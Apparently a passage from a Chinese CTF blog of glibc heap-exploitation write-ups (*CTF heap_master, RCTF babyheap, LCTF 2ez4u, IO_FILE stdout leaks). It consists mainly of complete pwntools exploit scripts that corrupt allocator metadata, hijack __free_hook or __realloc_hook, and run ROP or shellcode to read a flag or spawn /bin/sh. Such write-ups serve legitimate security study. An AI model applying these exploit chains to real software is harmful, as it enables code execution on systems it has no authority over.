'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)if debug == 1: libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') stdout_addr = 0x2620 elf = ELF('./heap_master') p = process('./heap_master')elif debug == 2: libc = ELF('./libc.so.6') stdout_addr = 0x5600 elf = change_ld("./heap_master",'./ld-linux-x86-64.so.2') p = elf.process(env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)def Add(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil("size: ") p.sendline(str(size))def Edit(offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil("offset: ") p.sendline(str(offset)) p.recvuntil("size: ") p.sendline(str(len(content))) p.recvuntil("content: ") p.send(content)def Delete(offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil("offset: ") p.sendline(str(offset))def Exit(): p.recvuntil('&gt;&gt; ') p.sendline('4')def exp(): offset = 0x8800-0x7a0 #leak libc Edit(offset+0,p64(0)+p64(0x331))#0 Edit(offset+0x330,p64(0)+p64(0x31))#1 Edit(offset+0x330+0x30,p64(0)+p64(0x411))#2 Edit(offset+0x330+0x30+0x410,p64(0)+p64(0x31))#3 Edit(offset+0x330+0x30+0x410+0x30,p64(0)+p64(0x411))#4 Edit(offset+0x330+0x30+0x410+0x30+0x410,p64(0)+p64(0x31))#5 Edit(offset+0x330+0x30+0x410+0x30+0x410+0x30,p64(0)+p64(0x31))#6 Delete(offset+0x10)#0 Delete(offset+0x330+0x30+0x10)#2 Add(0x90) #set two main_arena addr Edit(offset+0x330+0x30,p64(0)+p64(0x111)+p64(0)+p64(0x101)) Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101)) Edit(offset+0x330+0x30+0x110+0x100,p64(0)+p64(0x101)) Delete(offset+0x330+0x30+0x10+0x10) Add(0x90) Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101)) Delete(offset+0x330+0x30+0x10) Add(0x90) #recover #Edit(0x330+0x30,p64(0)+p64(0x411))#2 again Edit(offset+0x330+0x30+0x3f0,p64(0x3f0)+p64(0x20)+p64(0)*2+p64(0)+p64(0x31)) # Edit(offset+0x330+0x30+0x8,p64(0x3f1)+p64(0)+p16(stdout_addr-0x10)) Edit(offset+0x330+0x30+0x18+0x8,p64(0)+p16(stdout_addr+0x19-0x20)) Delete(offset+0x330+0x30+0x410+0x30+0x10)#4 gdb.attach(p) Add(0x90) if debug == 1: p.recvn(0x18) libc_base = u64(p.recv(8)) - (0x7ffff7dd06e0 - 0x7ffff7a0d000) #map map_addr = u64(p.recv(8)) - (0xc13b1800-0xc13a9000) else: map_addr = u64(p.recv(8)) - 0x8800 libc_base = u64(p.recv(8)) - (0x7ffff7dd5683-0x7ffff7a37000) log.success("libc base =&gt; " + hex(libc_base)) log.success("map addr =&gt; " + hex(map_addr)) #get shell offset = 0 Edit(offset+0,p64(0)+p64(0x331))#0 Edit(offset+0x330,p64(0)+p64(0x31))#1 Edit(offset+0x330+0x30,p64(0)+p64(0x511))#2 Edit(offset+0x330+0x30+0x510,p64(0)+p64(0x31))#3 Edit(offset+0x330+0x30+0x510+0x30,p64(0)+p64(0x511))#4 Edit(offset+0x330+0x30+0x510+0x30+0x510,p64(0)+p64(0x31))#5 Edit(offset+0x330+0x30+0x510+0x30+0x510+0x30,p64(0)+p64(0x31))#6 libc.address = libc_base _dl_open_hook = libc_base + (0x7ffff7dd92e0-0x7ffff7a37000) Delete(offset+0x10)#0 Delete(offset+0x330+0x30+0x10)#2 Add(0x90) # mov_rdi_call_rbx = libc_base + 0x7fd7d # gdb.attach(p) Delete(offset+0x330+0x30+0x510+0x30+0x10)#4 Edit(offset+0x330+0x30,p64(0)+p64(0x3f1)+p64(0)+p64(_dl_open_hook-0x10)+p64(0)+p64(_dl_open_hook-0x20)) Edit(offset+0x330+0x30+0x3f0,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21)) Add(0x90) # gdb.attach(p,'b *setcontext+53')# .text:000000000007FD7D mov rdi, [rbx+48h]# .text:000000000007FD81 mov rsi, r13# .text:000000000007FD84 call qword ptr [rbx+40h]# 0x7fae9ce44b75 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] Edit(offset+0x8a0,p64(mov_rdi_call_rbx)) Edit(offset+0x8a0+0x40,p64(libc.sym['setcontext']+53)+p64(map_addr+0x200)) # p_rsp = libc_base + 0x0000000000003870 Edit(offset+0x200+0x68,p64(map_addr)) Edit(offset+0x200+0x70,p64(0x10000)) Edit(offset+0x200+0x88,p64(7)) Edit(offset+0x200+0xa0,p64(map_addr+offset+0x200)+p64(libc.sym['mprotect'])) #sc sc = asm('mov rdi,'+str(map_addr+offset)) sc += asm(''' xor rsi,rsi xor rdx,rdx mov rax,2 syscall mov rdi,rax ''') sc += asm('mov rsi,'+str(map_addr+0x300)) sc += asm(''' mov rdx,48 mov rax,0 syscall mov rdi,1 mov rax,1 syscall ''') Edit(offset,'./flag\x00') Edit(offset+0x1f8,'./flag\x00\x00'+p64(map_addr+0x208)+sc) #offset+0x8900 Delete(111) p.interactive()exp() 方法三： unsorted bin+free_hook参考链接：https://z3r3f.gitee.io/2019/05/12/2019StartCTF/ 前面是unsorted bin的利用，来改global_max_fast和leak地址，和方法一的前部分是一样的 后面是利用free 指定大小的chunk 填入main_arena fastbinY的队列，覆盖free_hook所以我们找到main_arena到free_hook的偏移来算出chunk的指定size然后改值为system，delete内容为’/bin/sh’的chunk就可以getshell了 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#coding=utf8from sc_expwn import *# context.log_level = 'debug'context(arch='amd64', os='linux')context.terminal = ['tmux','splitw','-h']# p = process('./heap_master')p=remote('node3.buuoj.cn',27915)libc = ELF("./libc-2.23.so")# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def malloc(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size)) # else: # self.sendline('1') # self.sendline(str(size))def malloc_(size): p.sendline('1') p.sendline(str(size))def edit(offset,content): # if self.wait: p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(offset)) p.sendlineafter('size: ', str(len(content))) p.sendafter('content: ', content) # else: # self.sendline('2') # self.sendline(str(offset)) # self.sendline(str(len(content))) # self.send(content)def edit_(offset,content): p.sendline('2') p.sendline(str(offset)) p.sendline(str(len(content))) p.send(content)def free(offset): # if self.wait: p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(offset)) # else: # self.sendline('3') # self.sendline(str(offset))def free_(offset): p.sendline('3') p.sendline(str(offset)) libc_guess = 0x7ffff7a0d000offset_libc_free_hook= libc_guess +libc.symbols['__free_hook'] print hex(offset_libc_free_hook)offset_max_fast = offset_libc_free_hook +0x50# offset_max_fast=libc_guess+libc.symbols['global_max_fast']offset_libc_stdout=libc_guess+libc.symbols['_IO_2_1_stdout_']edit(0x8,p64(0x91)) #0edit(0x98, p64(0x21)) #1edit(0xb8, p64(0x21)) #2free(0x10) # gdb.attach(proc.pidof(p)[0])edit(0x18, p16((offset_max_fast-0x10)&amp;0xffff))malloc(0x80)#global_max_fast 赋值# gdb.attach(proc.pidof(p)[0])edit(0x8, p64(0xf1))edit(0xf8, p64(0x11)) free(0x10)edit(0x8, p64(0x91))# gdb.attach(p)edit(0x18, p16((offset_libc_stdout+0x10-0x10)&amp;0xffff)) #read_endmalloc(0x88)edit_(0x8, p64(0xf1))free_(0x10)edit_(0x8, p64(0x91))# gdb.attach(proc.pidof(p)[0])edit_(0x18, p16((offset_libc_stdout+0x20-0x10)&amp;0xffff)) #write_basemalloc_(0x88)heap_addr = u64(p.recv(8).ljust(8,'\x00'))-0x20print hex(heap_addr)fake = u64(p.recv(8).ljust(8,'\x00'))print hex(fake)addr_buf_base = u64(p.recv(8).ljust(8,'\x00'))print hex(addr_buf_base)libc_addr = u64(p.recv(8).ljust(8,'\x00'))-16 - libc.symbols['_IO_2_1_stdout_']print hex(libc_addr)p.recv(0x838)addr_stack= u64(p.recv(8).ljust(8,'\x00'))-0x3print hex(addr_stack)libc.address=libc_addraddr_libc_gets = libc.sep_function['gets']addr_libc_stdout = libc.symbols['_IO_2_1_stdout_']addr_libc_dl_open_hook = libc.symbols['_dl_open_hook']addr_libc_io_file_jumps = libc.symbols['_IO_file_jumps']addr_libc_io_str_jumps = addr_libc_io_file_jumps + 0xc0fastbin_ptr=libc.symbols['__free_hook']-0x1c88 +8free_hook=libc.sym["__free_hook"]system_addr=libc.sym["system"]size=0x3920fake_size=p64(size+1)edit(0x38,fake_size)edit(0x30+size,p64(0)+p64(0x21))free(0x40)edit(0x40,p64(system_addr))#修改fd为systemmalloc(0x3910)edit(0x110,'/bin/sh\x00')free(0x110)p.interactive() RCTF2019 babyheap这道题想解决的知识点： 1.colloc的原理2.house of strom 分析用mallopt关闭了fastbin的分配那就用large bin attack（也可以通过改global_max_fast来实现重新开启fastbin，这种方法会比较麻烦，这里重点讲largebin） off by one的洞，开了沙箱，ban掉了execve，就只能orw我们通过overlap来leak出libc的地址，然后构造chunk(size大于空闲块)，空闲块进入smallbin，然后就可以leak出heap的地址 colloccalloc申请堆块会对堆块进行清空 函数calloc() 会将所分配的内存空间中的每一位都初始化为零也就是说,如果你是为字符类型或整数类型的元素分配内存,那么这些元素将保证会被初始化为0;如果你是为指针类型的元素分配内存,那么这些元素通常会被初始化为空指针;如果你为实型数据分配内存,则这些元素会被初始化为浮点型的零. house of storm随后large bin 操作，实现overlap，构造chunk改bk 和bk_nextsize(house of storm)指向free_hook然后我们在一个chunk里填入orw的rop链再往free_hook里面填入setcontext+53的地址 123456789101112131415161718pwndbg&gt; x/40si 0x00007f52b004ab85 0x7f52b004ab85 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7f52b004ab8c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7f52b004ab93 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7f52b004ab97 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7f52b004ab9b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7f52b004ab9f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7f52b004aba3 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7f52b004aba7 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7f52b004abae &lt;setcontext+94&gt;: push rcx 0x7f52b004abaf &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7f52b004abb3 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7f52b004abba &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7f52b004abc1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7f52b004abc5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7f52b004abc9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7f52b004abcd &lt;setcontext+125&gt;: xor eax,eax 0x7f52b004abcf &lt;setcontext+127&gt;: ret 通过上面的gadget我们可以知道 12rdi在[rdi+0x68]上rsp在[rdi+0xa0]上 我们依照相应的位置写入rop的数据执行free操作的时候就可以调用rop链了 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146#coding=utf8from pwn import *context.log_level = "debug"# context.terminal = ["tmux","split","-h"]p = process("./babyheap")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")def add(size): p.recvuntil("Choice: ") p.sendline('1') p.recvuntil("Size: ") p.send(str(size))def edit(idx,data): p.recvuntil("Choice: ") p.sendline('2') p.recvuntil("Index: ") p.sendline(str(idx)) p.recvuntil("Content: ") p.send(data)def delete(idx): p.recvuntil("Choice: ") p.sendline('3') p.recvuntil("Index: ") p.sendline(str(idx))def show(idx): p.recvuntil("Choice: ") p.sendline('4') p.recvuntil("Index: ") p.sendline(str(idx))add(0x18) #0 0x21add(0x28) #1 0x31add(0xf8) #2add(0x18) #3add(0x18) #4add(0x508) #5add(0x18)add(0x18)add(0x508)add(0x18)# gdb.attach(p)delete(0) edit(1,'a'*0x20+p64(0x50))delete(2)add(0x18)show(1)libc_address=u64(p.recv(6).ljust(8,'\x00')) - 0x3c4b78print hex(libc_address)free_hook = libc.symbols["__free_hook"]+libc_addressfake_chunk = free_hook - 0x20# gdb.attach(p)add(0x68) #2add(0x48) #10add(0x100) #11 -&gt; old chunk2-&gt;smallbin 0xe0delete(2)add(0x100) #2 -&gt; chunk2 -&gt; smallbinshow(1)heap_base = u64(p.recvuntil("\n",drop=True).ljust(8,'\x00'))-0xe0print hex(heap_base)add(0x68)add(0x68)edit(5,'a'*0x4f0+p64(0x500))delete(5)edit(4,'a'*0x18)# gdb.attach(p)add(0x18)add(0x4d8) #14delete(5)delete(6)# --&gt;0x508add(0x30) add(0x4d0)# delete(8) #unsorted binedit(8,'a'*0x4f0+p64(0x500))delete(8)edit(7,'a'*0x18)add(0x18)#8add(0x4d8)#15delete(8)delete(9)# free -&gt;chunk5 but chunk8 hereadd(0x40)delete(6) #构造一个largebin 一个unsortedbinadd(0x4e8) #chunk5-&gt;largebin delete(6) #chunk2-&gt;unsortedbinpayload = p64(0)*3 + p64(0x4f1) + p64(0) + p64(fake_chunk) +p64(0)*2# bk fackchunk-&gt;fdedit(14,payload)payload2 = p64(0)*4 + p64(0) + p64(0x4e1) payload2 += p64(0) + p64(fake_chunk+8) #bk --&gt;fakechunk-&gt;bkpayload2 += p64(0) + p64(fake_chunk-0x18-5)#size 0x56edit(15,payload2)gdb.attach(p)add(0x40)# edit(8,p64(0)*3+p64(0x511))ret = libc_address+0x937p_rdi_r = libc_address+ 0x21112 #0x21102p_rsi_r = libc_address+ 0x202f8 #0x202e8p_rdx_r = libc_address+0x1b92rop_chain = "flag".ljust(8,"\x00")+p64(0)*12+p64(heap_base+0x1c0) #[rdi+0x68] is rdirop_chain += p64(0) #[rdi+0x70] is rsirop_chain += p64(0)*2 + p64(0) #[rdi+0x88] is rdxrop_chain = rop_chain.ljust(0xa0,"\x00")rop_chain += p64(heap_base+0x1c0+0x100)rop_chain += p64(libc.symbols["open"]+libc_address)rop_chain = rop_chain.ljust(0x100,"\x00")#now read and writerop_chain += p64(p_rdi_r)+p64(3)+p64(p_rsi_r)+p64(heap_base+0x1c0+0x200)rop_chain += p64(p_rdx_r)+p64(0x100)rop_chain += p64(libc.symbols["read"]+libc_address)rop_chain += p64(p_rdi_r)+p64(1)+p64(p_rsi_r)+p64(heap_base+0x1c0+0x200)rop_chain += p64(p_rdx_r)+p64(0x100)rop_chain += p64(libc.symbols["write"]+libc_address)edit(14,rop_chain)edit(6,"A"*0x10+p64(libc.symbols["setcontext"]+53+libc_address))delete(14)p.interactive() 参考链接https://blog.rois.io/2019/rctf-2019-official-writeup/https://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/ LCTF2017 2ez4u漏洞点是uaf官方wp给的是largebin的操作感觉看起来好复杂啊，调试也要调很久 用了unlink来控制堆块，然后两个smallbin绕过’\x00’，后面还将堆块劫持到main_arena上，多add几个大的chunk，到达freehook的位置，并赋值为system，然后再通过chunk1(unlink处理的chunk，overlap了很多个smallbin)，改chunk2的fd为’/bin/sh’,free(2)-&gt;system(&#39;/bin/sh&#39;) exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157#coding=utf8from pwn import *context.log_level = 'debug'p=process("./2ez4u")elf=ELF('./2ez4u')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(size,desc,color='0',value='0',num='0'): p.recvuntil("hoice: ") p.sendline("1") p.recvuntil("n):") p.sendline(str(color)) p.recvuntil("999):") p.sendline(str(value)) p.recvuntil("-16):") p.sendline(str(num)) p.recvuntil("024):") p.sendline(str(size)) p.recvuntil("apple:") p.send(desc)def edit(idx,desc,color='3',value='1000',num='100'): p.recvuntil("hoice: ") p.sendline("3") p.recvuntil("0-15):") p.sendline(str(idx)) p.recvuntil("n):") p.sendline(str(color)) p.recvuntil("999):") p.sendline(str(value)) p.recvuntil("-16):") p.sendline(str(num)) p.recvuntil("apple:") p.send(desc)def delete(idx): p.recvuntil("hoice: ") p.sendline("2") p.recvuntil("0-15):") p.sendline(str(idx))def show(idx): p.recvuntil("hoice: ") p.sendline("4") p.recvuntil("0-15):") p.sendline(str(idx))def exp(): add(0x10,'a\n') #0 add(0x10,'a\n') #1 add(0x10,'b\n') #2 add(0x3e0,"a\n") #3 add(0x60,"a\n") #4 add(0x3f0,"a\n") #5 add(0x40,"a\n") #6 add(0x80,'a\n') #7 add(0x60,'a\n') #8 add(0x50,'a\n') #9 add(0x290,'b\n') #10 add(0x80,'a\n') #11 delete(0) delete(5) delete(3) # gdb.attach(p) add(0x400,"a\n") #0 show(3) p.recvuntil("description:") heap_base=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))-0x4e0-0x30 print hex(heap_base) unlink_addr=heap_base+0x58 #chunk1-&gt;bk_nextsize fake_large=heap_base+0x910+0x30 #0x940 chunk6 payload=p64(0x411)+p64(unlink_addr-0x18)+p64(unlink_addr-0x10) edit(1,p64(fake_large)+'\n') ## write large bin address to bypass unlink the largebin #chunk6-10构成的fake_chunk edit(6,payload+"\n") edit(10,'a'*0x218+p64(0x410)+p64(0x70)+'\n') #chunk6-10构成的fake_chunk # log.info("fake large bin: %s"%hex(fake_large)) payload=p64(fake_large)+'\n' edit(3,payload) #chunk3‘s bk_nextsize delete(1) ## unlink clear 1st to avoid overwrite the 3rd ptr delete(11) delete(7) # delete the same size chunk to smallbin to bypass '\x00' truncated in add payload='a'*0x28+p64(heap_base+0xdc0)[:-1]+'\n' add(0x3f0,payload) # 1 malloc out the fake largebin edit(3,p64(heap_base+0x510)+'\n') ## fix the largebin chain add(0x80,'1\n') #3 ##在0xdc的地方malloc了，之后将chunk7的fd位置直接链接到了main_arena -&gt; show chunk1就能得到libc地址 show(1) p.recvuntil("a"*0x28) libc_base = u64(p.recv(6).ljust(8,'\x00'))-0x3c4c08 main_arena = libc_base+0x3c4b20 free_hook=libc_base+libc.symbols['__free_hook'] system_addr=libc_base+libc.symbols['system'] one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147] onegadget = libc_base+one_gadgets[1] edit(1,'a'*0x18+p64(0)+p64(0x81)[:-1]+'\n') #chunk7/2复原 delete(8) delete(9) #--&gt;2 fastbin fake_fastbin=main_arena+0x30 #布置恢复chunk2,chunk3-- chunk3--》main_arena+0x30 payload='a'*0x18+p64(0)+p64(0x81)+'\x00'*0x90+p64(0)+p64(0x81)+p64(0x71)+p64(0x0)+'\x00'*0x60+p64(0)+p64(0x71)+p64(fake_fastbin)[:-1]+'\n' edit(1,payload) ## change fastbin chain to form fastbin attack add(0x60,'a\n') add(0x50,'a\n') payload=p64(free_hook-0xb58)[:-1]+'\n' #自行计算到free_hook的距离 add(0x50,payload) #7 写进main_arena里面 delete(5) payload='a'*0x18+p64(0)+p64(0x81)+'\x00'*0x90+p64(0)+p64(0x81)+p64(0)+'\n' edit(1,payload) #把空闲chunk填了，并在main_arena的位置开始add chunk直至freehook delete(2) add(0x60,'a\n') #2 add(0x300,'\n') #5 add(0x300,'\n') #9 add(0x300,'\n') #12 add(0x300,'\n') #13 add(0x300,'/bin/sh\x00'+'\n') #14 gdb.attach(p) #system-》free_hook payload='\x00'*0x1d0+p64(system_addr)+'\n' add(0x320,payload) #15 payload='a'*0x18+p64(0)+p64(0x81)+'\x00'*0x90+p64(0)+p64(0x81)+'/bin/sh\x00'+'\n' edit(1,payload) ## trigger free to get shell delete(2) p.interactive()exp() 这题好像还能用fastbin attack做 参考链接 https://github.com/ray-cp/pwn_category/blob/master/heap/largebin_attack/lctf2017-2ez4u/exp.pyhttps://blog.pwnhub.cn/2017/11/22/LCTF-2017-%E5%AE%98%E6%96%B9Writeup/#2ez4uhttps://eternalsakura13.com/2018/03/21/lctf2/]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IO_FILE-leakaddr]]></title>
    <url>%2F2020%2F08%2F01%2FIO-FILE-leakaddr%2F</url>
    <content type="text"><![CDATA[任意读原理stderr、stdout、stdin这三个函数拥有IO_FILE结构体，要利用IO_FILE实现任意读，就要利用到stdout。首先，puts和write函数的执行，都会通过 _IO_new_file_overflow 这个函数最后执行 _IO_overflow puts: _IO_puts –&gt; _IO_sputn –&gt; _IO_new_file_xsputn –&gt; _IO_new_file_overflow –&gt; _IO_do_write –&gt; new_do_write –&gt; _IO_SYSWRITE fwrite: _IO_fwrite –&gt; _IO_sputn –&gt; _IO_new_file_xsputn –&gt; _IO_new_file_overflow –&gt; _IO_do_write –&gt; new_do_write –&gt; _IO_SYSWRITE _IO_new_file_xsputn的源码： 12345678910111213141516171819202122232425262728size_t_IO_new_file_xsputn (FILE *f, const void *data, size_t n)&#123; if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123;//判断缓存区有多少空间 count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; if (count &gt;= n) &#123; ... &#125; &#125; else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; if (count &gt; 0) &#123;//有空间的话就把数据拷贝至缓冲区 if (count &gt; to_do) count = to_do; f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count); s += count; to_do -= count; &#125; if (to_do + must_flush &gt; 0) &#123; size_t block_size, do_write; /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) //进入_IO_new_file_overflow /* If nothing else has to be written we must not signal the caller that everything has been written. */ return to_do == 0 ? EOF : n - to_do; _IO_new_file_overflow源码： 1234567891011121314151617181920212223242526272829303132int_IO_new_file_overflow (FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123;//不进入 f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123;//不进入 /* Allocate a buffer if needed. */ if (f-&gt;_IO_write_base == NULL) &#123; _IO_doallocbuf (f); _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base); &#125; ... ... &#125; if (ch == EOF) //调用_IO_new_do_write return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-&gt;_IO_write_ptr++ = ch; if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &apos;\n&apos;)) if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch;&#125; _IO_new_do_write的源码： 123456789101112131415161718192021222324static size_tnew_do_write (FILE *fp, const char *data, size_t to_do)&#123; size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123;//不能进入 off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); // fseek(stdout, x, 1) always return _IO_pos_BAD (-1) if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; count = _IO_SYSWRITE (fp, data, to_do);//执行write ... ... return count;&#125; 12345//glibc/libio/libio.h#define _IO_NO_WRITES 0x0008#define _IO_CURRENTLY_PUTTING 0x0800#define _IO_IS_APPENDING 0x1000 关于flag的绕过：1234567综上，我们需要绕过的有：- f-&gt;_flags &amp; _IO_NO_WRITES = 0- f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = 1- fp-&gt;_IO_read_end = fp-&gt;_IO_write_base 或者 _flag &amp; IO_IS_APPENDING = 1- _fileno = 1- _IO_write_base是我们传输给_IO_SYSWRITE的参数，即是我们leak出来的地址- _IO_write_base与_IO_write_ptr的差是write出来的字节数，所以我们要覆盖base的低位使之变小 _flags里面包含_IO_IS_APPENDING，_IO_IS_APPENDING的定义为#define _IO_IS_APPENDING 0x1000，这样就不会走后面的这个判断而直接执行到_IO_SYSWRITE了按理是满足接下来这些条件就可以了的： 1234567&gt; #_IO_new_file_xsputn (if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)))&gt; f-&gt;flag &amp; 0xa00 &gt;0;&gt; #_IO_new_file_overflow f-&gt;_flags &amp; _IO_NO_WRITES&gt; f-&gt;_flags &amp; 0x8 = 0;&gt; #new_do_write if (fp-&gt;_flags &amp; _IO_IS_APPENDING)&gt; f-&gt;flag &amp; 0x1000 == 1;(&gt;0)&gt; f-&gt;write_base != f-&gt;write_ptr; 123456flag = 0xfbad0000flag &amp;= ~0x008 （最后一位）flag |= 0x0800 （倒数三位） 不能是奇数flag |= 0x1000 （倒数第四位） 不能是偶数--&gt; flag = 0xfbad1800 不改flag的绕过：要使fp-&gt;_IO_read_end != fp-&gt;_IO_write_base不成立才能执行write 所以要满足的条件： 12345_IO_write_base指向想要泄露的地方。_IO_write_ptr指向泄露结束的地址。//两者要有差距_IO_read_end等于_IO_write_base以绕过多余的代码。//满足这三个条件，可实现任意读。 例题：2019 one_heap这是一道tcache+IO_FILE的题 有限的删除数量，就利用tcache机制构造chunk，将chunk写进unsorted bin里 指针指向stdout，实现覆写flag和write_base等数据，leak出libc的地址，然后unsorted bin attack 更改realloc_hook。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#gdb.attach(p)def add(size,content): p.recvuntil('choice:') p.sendline("1") p.recvuntil("size:") p.sendline(str(size)) p.recvuntil('content') p.send(content)def delete(): p.recvuntil('choice:') p.sendline("2")while True: try: p = process("./one_heap") #p = remote('47.104.89.129',10001) #context.log_level='debug' #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('./libc-2.27.so') gdb.attach(p) add(0x7f,'\n') delete() delete() add(0x2f,p64(0)*2+p64(0x80)+p64(0x20)+'\n') delete() add(0x7f,'\n') add(0x7f,'\n') add(0x7f,'\n') delete() add(0x20,'\x60\x97\n') add(0x7f,p64(0)*4+p64(0)+p64(0x81)+'\n') add(0x7f,p64(0xfbad1800)+p64(0)*3+'\x00'+'\n') p.recv(8) p.recv(8) libc.address=u64((p.recv(6)).ljust(8,'\x00'))-0x3ed8b0 print hex(libc.address) realloc_hook=libc.symbols['__realloc_hook'] realloc = libc.symbols['realloc'] one_gadget = libc.address+0x10a38c add(0x70,p64(0)*10+p64(0)+p64(0x41)+p64(realloc_hook)+'\n') add(0x30,'\n') add(0x30,p64(one_gadget)+p64(realloc+4)+'\n') add(0x10,'\n') p.interactive() break except: continue 2109 数字经济 fkroman没办法通过show函数leak出libc的地址，所以我们会想到IO_FILE漏洞，可以uaf，然后，edit可以自己重写size，造成溢出，重构fd，达到任意地址写的目的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#coding:utf-8from pwn import *context.log_level = 'debug'p = process('./fkroman')elf = ELF('./fkroman')libc = ELF('./libc-2.23.so')one = [0x45216,0x4526a,0xf02a4,0xf1147]def add(idx,size): p.recvuntil("Your choice: ") p.sendline("1") p.recvuntil("Index: ") p.sendline(str(idx)) p.recvuntil("Size: ") p.sendline(str(size))def delt(idx): p.recvuntil("Your choice: ") p.sendline("3") p.recvuntil("Index: ") p.sendline(str(idx))def edit(idx,size,content): p.recvuntil("Your choice: ") p.sendline("4") p.recvuntil("Index: ") p.sendline(str(idx)) p.recvuntil("Size: ") p.sendline(str(size)) p.recvuntil("Content: ") p.send(content)add(0,0x68) #0# edit(0,0x68,'a'*0x68)add(1,0x68) #1add(2,0x68) #2# add(3,0x68)edit(2,0x20,p64(0)*3+p64(0x51))delt(1)edit(0,0x70,'\x00'*0x68+p64(0x91))gdb.attach(p)delt(1) 